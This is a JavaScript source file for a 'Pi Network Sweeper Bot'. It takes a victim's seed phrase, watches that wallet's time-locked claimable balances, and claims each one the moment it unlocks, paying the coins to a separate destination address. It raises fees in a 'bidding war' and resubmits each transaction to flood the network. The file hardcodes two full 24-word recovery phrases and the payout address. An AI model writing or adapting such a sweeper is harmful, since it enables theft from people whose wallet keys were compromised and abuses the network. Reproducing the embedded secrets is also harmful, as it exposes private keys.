// Pi Network Sweeper Bot: Claim All & Continuous Flood
// Claims all available claimable balances in a loop, engaging in bidding wars & network flooding until manually stopped.

import * as ed25519 from 'ed25519-hd-key';
import StellarSdk, { TimeoutInfinite } from 'stellar-sdk';
import * as bip39 from 'bip39';

// Configuration
const config = {
    horizonUrl: 'https://api.mainnet.minepi.com',
    networkPassphrase: 'Pi Network',
    baseFee: 5000000,              // 0.5 PI
    maxFee: 1000000,              // 0.1 PI
    feePriorityMultiplier: 2.1,   // multiply fee each retry
    maxSubmissionAttempts: 5,
    floodCount: 3,                // duplicates per success
    floodInterval: 200,           // ms between floods
    debug: true,
    timeboundGrace: 60,
};

class PiSweeperBot {
    constructor(targetMnemonic, destination, sponsorMnemonic) {
        this.dest = destination;
        this.targetKP = this.mnemonicToKeypair(targetMnemonic);
        this.sponsorKP = this.mnemonicToKeypair(sponsorMnemonic);
        this.server = new StellarSdk.Server(config.horizonUrl, { allowHttp: false });
        this.network = config.networkPassphrase;
        this.currentFee = config.baseFee;
        // URL for manual inspection
        this.claimableUrl = `${config.horizonUrl}/claimable_balances?claimant=${this.targetKP.publicKey()}`;
        this.log(`Initialized. Check balances: ${this.claimableUrl} Target: ${this.targetKP.publicKey()}`);
    }

    log(msg) {
        if (config.debug) console.log(`[${new Date().toISOString()}] ${msg}`);
    }

    mnemonicToKeypair(mnemonic) {
        const seed = bip39.mnemonicToSeedSync(mnemonic);
        const path = "m/44'/314159'/0'";
        const { key } = ed25519.derivePath(path, seed.toString('hex'));
        return StellarSdk.Keypair.fromRawEd25519Seed(Buffer.from(key));
    }

    // Fetch all claimable balances for target
    async getAllBalances() {
        const resp = await this.server
            .claimableBalances()
            .claimant(this.targetKP.publicKey())
            .limit(100)
            .call();
        console.log(resp, "HOLLA")
        return resp.records;
    }

    pauseUntil2SecondsBefore(targetTimestamp) {
        const now = Date.now(); // in milliseconds
        const targetTimeMs = targetTimestamp * 1000; // convert to ms
        const pauseDuration = targetTimeMs - now - 2000; // 2 seconds before
    
        if (pauseDuration <= 0) {
            return Promise.resolve(); // No need to wait
        }
    
        return new Promise(resolve => setTimeout(resolve, pauseDuration));
    }
    

    extractMinTime(balance) {
        // 'not.abs_before' means claimable after this time
        const claimant = balance.claimants.find(c => c.destination === this.targetKP.publicKey());
        if (claimant && claimant.predicate) {
            if (claimant.predicate.abs_after) {
                console.log(claimant.predicate.abs_after, " CHEKC")
                return parseInt(claimant.predicate.abs_after, 10);
            }
            if (claimant.predicate.not && claimant.predicate.not.abs_before_epoch) {
                console.log(claimant.predicate.not.abs_before_epoch, " CHEKC TIME")

                return parseInt(claimant.predicate.not.abs_before_epoch, 10);
            }
        }
        return 0;
    }

    // Build and sign transaction for a given balance
    async buildTxForBalance(balanceId, amount, balance) {
        const unlockTime = this.extractMinTime(balance);
        
        // Use Math.floor to ensure integer timestamp
        const lowerBound = Math.floor((Date.now() + 2000) / 1000);
        const upperBound = Math.floor(unlockTime + config.timeboundGrace);
        
        // Validate time bounds
        if (lowerBound >= upperBound) {
            throw new Error(`Invalid time bounds: lowerBound (${lowerBound}) must be less than upperBound (${upperBound})`);
        }
        
        // Load sponsor account
        const sponsorAcc = await this.server.loadAccount(this.sponsorKP.publicKey());
        
        // Build and return the transaction
        return new StellarSdk.TransactionBuilder(sponsorAcc, {
            fee: String(this.currentFee),
            networkPassphrase: this.network,
        })
        .addOperation(StellarSdk.Operation.claimClaimableBalance({
            balanceId,
            source: this.targetKP.publicKey(),
        }))
        .addOperation(StellarSdk.Operation.payment({
            destination: this.dest,
            asset: StellarSdk.Asset.native(),
            amount: String(amount), // Ensure amount is a string
            source: this.targetKP.publicKey(),
        }))
        .setTimebounds(lowerBound, upperBound)
        // .setTimeout(300) // Add explicit timeout (5 minutes)
        .build();
    }

    // Main loop: claim each balance continuously
    async start() {
        while (true) {
            try {
                // Refresh fee
                await this.updateFeeStats();
                const balances = await this.getAllBalances();

                if (!balances.length) {
                    this.log('No claimable balances found. Waiting...');
                    await new Promise(res => setTimeout(res, 5000));
                    continue;
                }

                for (const bal of balances) {
                    const id = bal.id;
                    const amt = bal.amount;
                    this.log(`Processing balance ${id} (${amt} PI)`);

                    let attempt = 0;
                    while (attempt < config.maxSubmissionAttempts) {
                        try {
                            // await this.pauseUntil2SecondsBefore(this.extractMinTime(bal))
                            // await this.pauseUntil2SecondsBefore(Date.now() + 2000)

                            const tx = await this.buildTxForBalance(id, amt, bal);
                            tx.sign(this.targetKP);
                            tx.sign(this.sponsorKP);
                            const res = await this.server.submitTransaction(tx);
                            this.log(`Success (hash=${JSON.stringify(res)})`);

                            if (res.title == "Transaction Failed") throw new Error(`${res.title} error: ${res.extras.result_codes}`)
                            this.log(`Success (hash=${res})`);
                            // Flood duplicates
                            for (let i = 0; i < config.floodCount; i++) {
                                setTimeout(() => {
                                    this.server.submitTransaction(tx).catch(err => {
                                        this.log(`Flood ${i + 1} failed: ${err}`);
                                    });
                                }, i * config.floodInterval);
                            }
                            break; // move to next balance
                        } catch (err) {
                            this.log(`Attempt ${attempt + 1} failed: ${JSON.stringify(err)}`);
                            // Bidding war: bump fee
                            this.currentFee = this.currentFee * config.feePriorityMultiplier;
                            this.log(`Bumping fee to ${this.currentFee}`);
                        }
                        attempt++;

                    }
                }
            } catch (e) {
                this.log(`Error in loop: ${e.message}`);
            }
        }
    }

    async updateFeeStats() {
        const stats = await this.server.feeStats();
        const p99 = parseInt(stats.fee_charged.p99, 10);
        let fee = Math.max(p99 * config.feePriorityMultiplier, config.baseFee);
        this.currentFee = fee
        this.log(`Fee updated: ${this.currentFee} stroops`);
    }
}

(async () => {

    const target = 'embrace gloom critic jaguar echo concert execute dawn shed myth bread random orient hedgehog pond corn eye raccoon energy situate indicate resist pool sad';
    const sponsor = 'cute increase lab raw blade lawsuit soon congress title flat brown smoke hair hard property copper limit regular process remember use safe yellow quantum';
    const dest = 'GAHQMFHVA7EKDD54L4HBX4QNCTGCLVTCP5DXKKFSTEBTQBNG6WDVGLCR';
    const bot = new PiSweeperBot(target, dest, sponsor);
    await bot.start();
})();
